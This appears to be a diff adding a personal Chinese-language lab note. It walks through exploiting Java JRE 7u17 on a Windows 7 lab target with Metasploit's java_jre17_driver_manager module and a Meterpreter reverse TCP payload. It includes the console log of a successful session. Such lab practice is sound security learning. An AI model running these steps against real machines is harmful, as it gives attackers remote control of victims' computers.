@@ -1,0 +1,58 @@
+1.靶机安装java
+jre-7u17-windows-i586版本，安装到win7
+原理：靶机打开一个连接，执行java
+  ie浏览器，其他的搞不定；可以在Chrome浏览器设置
+  edge://settings/defaultBrowser
+  允许在 Internet Explorer 模式下重新加载网站_>允许
+
+
+2.攻击机
+msconsole
+
+msf6 > use exploit/multi/browser/java_jre17_driver_manager 
+msf6 exploit(multi/browser/java_jre17_driver_manager) > show options
+msf6 exploit(multi/browser/java_jre17_driver_manager) > jobs
+msf6 exploit(multi/browser/java_jre17_driver_manager) > show payloads
+msf6 exploit(multi/browser/java_jre17_driver_manager) > set payload java/meterpreter/reverse_tcp 
+msf6 exploit(multi/browser/java_jre17_driver_manager) > run
+[*] Exploit running as background job 4.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.211.55.6:4444 
+msf6 exploit(multi/browser/java_jre17_driver_manager) > [*] Using URL: http://10.211.55.6:8080/u2ftnukwFx
+[*] Server started.
+[*] 10.211.55.4      java_jre17_driver_manager - handling request for /u2ftnukwFx
+[*] 10.211.55.4      java_jre17_driver_manager - handling request for /u2ftnukwFx/
+[*] 10.211.55.4      java_jre17_driver_manager - handling request for /u2ftnukwFx/
+[*] 10.211.55.4      java_jre17_driver_manager - handling request for /u2ftnukwFx/eWwHxlbn.jnlp
+[*] 10.211.55.4      java_jre17_driver_manager - handling request for /u2ftnukwFx/zOzMRmoV.jar
+[*] Sending stage (58829 bytes) to 10.211.55.4
+[*] Meterpreter session 6 opened (10.211.55.6:4444 -> 10.211.55.4:54924) at 2022-06-02 15:54:47 +0800
+出现这个就代表成功建立连接
+
+msf6 exploit(multi/browser/java_jre17_driver_manager) > sessions
+查看当前会话
+
+Active sessions
+===============
+
+  Id  Name  Type                      Information          Connection
+  --  ----  ----                      -----------          ----------
+  6         meterpreter java/windows  hejian @ HEJIAN2F4F  10.211.55.6:4444 -> 10.211.55.4:54924 (10.211.55.4)
+
+msf6 exploit(multi/browser/java_jre17_driver_manager) > sessions -i 6
+载入 会话6
+
+[*] Starting interaction with 6...
+
+meterpreter > 
+代表已入侵成功
+
+
+
+
+
+
+
+
+
